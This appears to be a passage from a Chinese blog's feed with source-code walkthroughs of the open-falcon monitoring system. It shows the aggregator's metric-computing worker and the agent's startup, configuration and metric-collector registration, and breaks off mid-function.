&#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">s1 := rand.NewSource(time.Now().UnixNano() * this.ClusterItem.Id)</span><br><span class="line">r1 := rand.New(s1)</span><br><span class="line"><span class="comment">// 60s, step usually</span></span><br><span class="line">delay := r1.Int63n(<span class="number">60000</span>)</span><br><span class="line"><span class="keyword">if</span> g.Config().Debug &#123;</span><br><span class="line">log.Printf(<span class="string">"[I] after %5d ms, start worker %d"</span>, delay, this.ClusterItem.Id)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">time.Sleep(time.Duration(delay) * time.Millisecond)</span><br><span class="line">this.Ticker = time.NewTicker(time.Duration(this.ClusterItem.Step) * time.Second)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-this.Ticker.C:</span><br><span class="line">WorkerRun(this.ClusterItem)</span><br><span class="line"><span class="keyword">case</span> &lt;-this.Quit:</span><br><span class="line"><span class="keyword">if</span> g.Config().Debug &#123;</span><br><span class="line">log.Println(<span class="string">"[I] drop worker"</span>, this.ClusterItem)</span><br><span class="line">&#125;</span><br><span class="line">this.Ticker.Stop()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置定时器执行函数WorkerRun</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WorkerRun</span><span class="params">(item *g.Cluster)</span></span> &#123;</span><br><span class="line">debug := g.Config().Debug</span><br><span class="line"></span><br><span class="line">numeratorStr := cleanParam(item.Numerator)        <span class="comment">//</span></span><br><span class="line">denominatorStr := cleanParam(item.Denominator)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !expressionValid(numeratorStr) || !expressionValid(denominatorStr) &#123;</span><br><span class="line">log.Println(<span class="string">"[W] invalid numerator or denominator"</span>, item)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 判断包含$(需要解析</span></span><br><span class="line">needComputeNumerator := needCompute(numeratorStr)</span><br><span class="line">needComputeDenominator := needCompute(denominatorStr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !needComputeNumerator &amp;&amp; !needComputeDenominator &#123;</span><br><span class="line">log.Println(<span class="string">"[W] no need compute"</span>, item)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析算子</span></span><br><span class="line">numeratorOperands, numeratorOperators, numeratorComputeMode := parse(numeratorStr, needComputeNumerator)</span><br><span class="line">denominatorOperands, denominatorOperators, denominatorComputeMode := parse(denominatorStr, needComputeDenominator)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 操作非法</span></span><br><span class="line"><span class="keyword">if</span> !operatorsValid(numeratorOperators) || !operatorsValid(denominatorOperators) &#123;</span><br><span class="line">log.Println(<span class="string">"[W] operators invalid"</span>, item)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 根据id获取hostname</span></span><br><span class="line">hostnames, err := sdk.HostnamesByID(item.GroupId)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> || <span class="built_in">len</span>(hostnames) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">now := time.Now().Unix()</span><br><span class="line"><span class="comment">// 获取最新的数据点</span></span><br><span class="line">valueMap, err := queryCounterLast(numeratorOperands, denominatorOperands, hostnames, now-<span class="keyword">int64</span>(item.Step*<span class="number">2</span>), now)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"[E]"</span>, err, item)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> numerator, denominator <span class="keyword">float64</span></span><br><span class="line"><span class="keyword">var</span> validCount <span class="keyword">int</span></span><br><span class="line"><span class="comment">// 每个机器计算</span></span><br><span class="line"><span class="keyword">for</span> _, hostname := <span class="keyword">range</span> hostnames &#123;</span><br><span class="line"><span class="keyword">var</span> numeratorVal, denominatorVal <span class="keyword">float64</span></span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="comment">// 需要计算分子</span></span><br><span class="line"><span class="keyword">if</span> needComputeNumerator &#123;</span><br><span class="line">numeratorVal, err = compute(numeratorOperands, numeratorOperators, numeratorComputeMode, hostname, valueMap)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug &amp;&amp; err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">"[W] [hostname:%s] [numerator:%s] id:%d, err:%v"</span>, hostname, item.Numerator, item.Id, err)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> debug &#123;</span><br><span class="line">log.Printf(<span class="string">"[D] [hostname:%s] [numerator:%s] id:%d, value:%0.4f"</span>, hostname, item.Numerator, item.Id, numeratorVal)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 需要计算分母</span></span><br><span class="line"><span class="keyword">if</span> needComputeDenominator &#123;</span><br><span class="line">denominatorVal, err = compute(denominatorOperands, denominatorOperators, denominatorComputeMode, hostname, valueMap)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug &amp;&amp; err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">"[W] [hostname:%s] [denominator:%s] id:%d, err:%v"</span>, hostname, item.Denominator, item.Id, err)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> debug &#123;</span><br><span class="line">log.Printf(<span class="string">"[D] [hostname:%s] [denominator:%s] id:%d, value:%0.4f"</span>, hostname, item.Denominator, item.Id, denominatorVal)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug &#123;</span><br><span class="line">log.Printf(<span class="string">"[D] hostname:%s  numerator:%0.4f  denominator:%0.4f  per:%0.4f\n"</span>, hostname, numeratorVal, denominatorVal, numeratorVal/denominatorVal)</span><br><span class="line">&#125;</span><br><span class="line">numerator += numeratorVal</span><br><span class="line">denominator += denominatorVal</span><br><span class="line">validCount += <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 不需要要计算分子</span></span><br><span class="line"><span class="keyword">if</span> !needComputeNumerator &#123;</span><br><span class="line"><span class="keyword">if</span> numeratorStr == <span class="string">"$#"</span> &#123;</span><br><span class="line">numerator = <span class="keyword">float64</span>(validCount)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">numerator, err = strconv.ParseFloat(numeratorStr, <span class="number">64</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">"[E] strconv.ParseFloat(%s) fail %v, id:%d"</span>, numeratorStr, err, item.Id)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 不需要计算分母</span></span><br><span class="line"><span class="keyword">if</span> !needComputeDenominator &#123;</span><br><span class="line"><span class="keyword">if</span> denominatorStr == <span class="string">"$#"</span> &#123;</span><br><span class="line">denominator = <span class="keyword">float64</span>(validCount)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">denominator, err = strconv.ParseFloat(denominatorStr, <span class="number">64</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">"[E] strconv.ParseFloat(%s) fail %v, id:%d"</span>, denominatorStr, err, item.Id)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> denominator == <span class="number">0</span> &#123;</span><br><span class="line">log.Println(<span class="string">"[W] denominator == 0, id:"</span>, item.Id)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> validCount == <span class="number">0</span> &#123;</span><br><span class="line">log.Println(<span class="string">"[W] validCount == 0, id:"</span>, item.Id)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug &#123;</span><br><span class="line">log.Printf(<span class="string">"[D] hostname:all  numerator:%0.4f  denominator:%0.4f  per:%0.4f\n"</span>, numerator, denominator, numerator/denominator)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// sender push推送集群数据，给agent节点推送数据，数据传输通过/v1/push转发到transfer,这个地方需要注意的！！！</span></span><br><span class="line">sender.Push(item.Endpoint, item.Metric, item.Tags, numerator/denominator, item.DsType, <span class="keyword">int64</span>(item.Step))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-aggregator源码分析&quot;&gt;&lt;a href=&quot;#open-falcon-aggregator源码分析&quot; class=&quot;headerlink&quot; title=&quot;open-falcon aggregator源码分析&quot;&gt;&lt;/a&gt;open-fal
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon agent源码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/21/agent%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/01/21/agent%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-01-21T09:07:41.265Z</published>
    <updated>2020-01-21T09:06:43.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-agent源码分析"><a href="#open-falcon-agent源码分析" class="headerlink" title="open-falcon agent源码分析"></a>open-falcon agent源码分析</h2><p>因为工作需要，将这个open-falcon代码逻辑需要整理清楚。有些部分需要定制修改。</p><p>本篇文章主要是针对open-falcon 中agent模块进行分析。</p><p>主流程再module/agent/module中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">g.BinaryName = BinaryName</span><br><span class="line">g.Version = Version</span><br><span class="line">g.GitCommit = GitCommit</span><br><span class="line"></span><br><span class="line">cfg := flag.String(<span class="string">"c"</span>, <span class="string">"cfg.json"</span>, <span class="string">"configuration file"</span>)</span><br><span class="line">version := flag.Bool(<span class="string">"v"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">check := flag.Bool(<span class="string">"check"</span>, <span class="literal">false</span>, <span class="string">"check collector"</span>)</span><br><span class="line"><span class="comment">//解析参数</span></span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *version &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *check &#123;</span><br><span class="line">        <span class="comment">// 检查当前系统磁盘cpu等信息，有问题就退出</span></span><br><span class="line">funcs.CheckCollector()</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解析配置文件</span></span><br><span class="line">g.ParseConfig(*cfg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g.Config().Debug &#123;</span><br><span class="line">g.InitLog(<span class="string">"debug"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">g.InitLog(<span class="string">"info"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 初始化root目录</span></span><br><span class="line">g.InitRootDir()</span><br><span class="line">    <span class="comment">// localip初始化其实就是检查hbs服务是否启动能够连接。同时根据hbs来获取本地ip</span></span><br><span class="line">g.InitLocalIp()</span><br><span class="line">    <span class="comment">// 初始化rpc客户端</span></span><br><span class="line">g.InitRpcClients()</span><br><span class="line"><span class="comment">// 构建需要抓取的指标数据</span></span><br><span class="line">funcs.BuildMappers()</span><br><span class="line"><span class="comment">// 定时更新cpu和disk状态历史数据</span></span><br><span class="line"><span class="keyword">go</span> cron.InitDataHistory()</span><br><span class="line"><span class="comment">// 定时给hbs报告agent本机状态</span></span><br><span class="line">cron.ReportAgentStatus()</span><br><span class="line">    <span class="comment">//同步插件，没咋用过</span></span><br><span class="line">cron.SyncMinePlugins()</span><br><span class="line">    <span class="comment">//调用hbs rpc接口BuiltinMetrics来获取BuiltinMetrics数据。同步监控端口、路径、进程和URL</span></span><br><span class="line">cron.SyncBuiltinMetrics()</span><br><span class="line">    <span class="comment">//定时检查信任ip</span></span><br><span class="line">cron.SyncTrustableIps()</span><br><span class="line">    <span class="comment">//定时收集指标数据</span></span><br><span class="line">cron.Collect()</span><br><span class="line"><span class="comment">//启动http接口方便查询</span></span><br><span class="line"><span class="keyword">go</span> http.Start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看下配置文件：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"debug"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"hostname"</span>: <span class="string">""</span>,         </span><br><span class="line">    <span class="attr">"ip"</span>: <span class="string">""</span>,</span><br><span class="line">    "plugin": &#123;               # 插件</span><br><span class="line">        "enabled": false,</span><br><span class="line">        "dir": "./plugin",</span><br><span class="line">        "git": "https://github.com/open-falcon/plugin.git",</span><br><span class="line">        "logs": "./logs"</span><br><span class="line">    &#125;,</span><br><span class="line">    "heartbeat": &#123;            # 心跳</span><br><span class="line">        "enabled": true,</span><br><span class="line">        "addr": "127.0.0.1:6030",</span><br><span class="line">        "interval": 60,</span><br><span class="line">        "timeout": 1000</span><br><span class="line">    &#125;,</span><br><span class="line">    "transfer": &#123;             # 传输地址</span><br><span class="line">        "enabled": true,</span><br><span class="line">        "addrs": [</span><br><span class="line">            "127.0.0.1:8433",</span><br><span class="line">            <span class="string">"127.0.0.1:8433"</span></span><br><span class="line">        ],</span><br><span class="line">        "interval": 60,</span><br><span class="line">        "timeout": 1000</span><br><span class="line">    &#125;,</span><br><span class="line">    "http": &#123;                # http</span><br><span class="line">        "enabled": true,</span><br><span class="line">        "listen": ":1988",</span><br><span class="line">        "backdoor": false</span><br><span class="line">    &#125;,</span><br><span class="line">    "collector": &#123;          # 收集接口数据</span><br><span class="line">        "ifacePrefix": ["eth", "em"],</span><br><span class="line">        "mountPoint": []</span><br><span class="line">    &#125;,</span><br><span class="line">    "default_tags": &#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    "ignore": &#123;                    </span><br><span class="line">        "cpu.busy": true,</span><br><span class="line">        "df.bytes.free": true,</span><br><span class="line">        "df.bytes.total": true,</span><br><span class="line">        "df.bytes.used": true,</span><br><span class="line">        "df.bytes.used.percent": true,</span><br><span class="line">        "df.inodes.total": true,</span><br><span class="line">        "df.inodes.free": true,</span><br><span class="line">        "df.inodes.used": true,</span><br><span class="line">        "df.inodes.used.percent": true,</span><br><span class="line">        "mem.memtotal": true,</span><br><span class="line">        "mem.memused": true,</span><br><span class="line">        "mem.memused.percent": true,</span><br><span class="line">        "mem.memfree": true,</span><br><span class="line">        "mem.swaptotal": true,</span><br><span class="line">        "mem.swapused": true,</span><br><span class="line">        "mem.swapfree": true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看看InitRootDir函数，主要获取了根目录，为了后续启动http拼接路径。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRootDir</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">Root, err = os.Getwd()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">"getwd fail:"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取函数InitLocalIp，该函数获取hbs连接。获取本地localip地址，主要为了能够后续给hbs发送心跳报告。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitLocalIp</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> Config().Heartbeat.Enabled &#123;</span><br><span class="line">conn, err := net.DialTimeout(<span class="string">"tcp"</span>, Config().Heartbeat.Addr, time.Second*<span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"get local addr failed !"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">LocalIp = strings.Split(conn.LocalAddr().String(), <span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">conn.Close()</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">log.Println(<span class="string">"hearbeat is not enabled, can't get localip"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化hbs的rpc客户端连接：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRpcClients</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> Config().Heartbeat.Enabled &#123;</span><br><span class="line">HbsClient = &amp;SingleConnRpcClient&#123;</span><br><span class="line">RpcServer: Config().Heartbeat.Addr,</span><br><span class="line">Timeout:   time.Duration(Config().Heartbeat.Timeout) * time.Millisecond,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数BuildMappers，构建指标函数，类似于将所有的指标函数注册到map中去。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BuildMappers</span><span class="params">()</span></span> &#123;</span><br><span class="line">interval := g.Config().Transfer.Interval</span><br><span class="line">Mappers = []FuncsAndInterval&#123;</span><br><span class="line">&#123;</span><br><span class="line">Fs: []<span class="function"><span class="keyword">func</span><span class="params">()</span> []*<span class="title">model</span>.<span class="title">MetricValue</span></span>&#123;</span><br><span class="line">AgentMetrics,</span><br><span class="line">CpuMetrics,</span><br><span class="line">NetMetrics,</span><br><span class="line">KernelMetrics,</span><br><span class="line">LoadAvgMetrics,</span><br><span class="line">MemMetrics,</span><br><span class="line">DiskIOMetrics,</span><br><span class="line">IOStatsMetrics,</span><br><span class="line">NetstatMetrics,</span><br><span class="line">ProcMetrics,</span><br><span class="line">UdpMetrics,</span><br><span class="line">&#125;,</span><br><span class="line">Interval: interval,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">Fs: []<span class="function"><span class="keyword">func</span><span class="params">()</span> []*<span class="title">model</span>.<span class="title">MetricValue</span></span>&#123;</span><br><span class="line">DeviceMetrics,</span><br><span class="line">&#125;,</span><br><span class="line">Interval: interval,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">Fs: []<span class="function"><span class="keyword">func</span><span class="params">()</span> []*<span class="title">model</span>.<span class="title">MetricValue</span></span>&#123;</span><br><span class="line">PortMetrics,</span><br><span class="line">SocketStatSummaryMetrics,</span><br><span class="line">&#125;,</span><br><span class="line">Interval: interval,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">Fs: []<span class="function"><span class="keyword">func</span><span class="params">()</span> []*<span class="title">model</span>.<span class="title">MetricValue</span></span>&#123;</span><br><span class="line">DuMetrics,</span><br><span class="line">&#125;,</span><br><span class="line">Interval: interval,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">Fs: []<span class="function"><span class="keyword">func</span><span class="params">()</span> []*<span class="title">model</span>.<span class="title">MetricValue</span></span>&#123;</span><br><span class="line">UrlMetrics,</span><br><span class="line">&#125;,</span><br><span class="line">Interval: interval,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">Fs: []<span class="function"><span class="keyword">func</span><span class="params">()</span> []*<span class="title">model</span>.<span class="title">MetricValue</span></span>&#123;</span><br><span class="line">GpuMetrics,</span><br><span class="line">&#125;,</span><br><span class="line">Interval: interval,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数InitDataHistory：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitDataHistory</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">funcs.UpdateCpuStat()  <span class="comment">//更新cpu状态信息   方便后续统计的时候用到了。</span></span><br><span class="line">funcs.UpdateDiskStats()  <span class="comment">// 更新disk状态信息</span></span><br><span class="line">time.Sleep(g.COLLECT_INTERVAL)  <span class="comment">// 间隔</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数reportAgentStatus函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReportAgentStatus</span><span 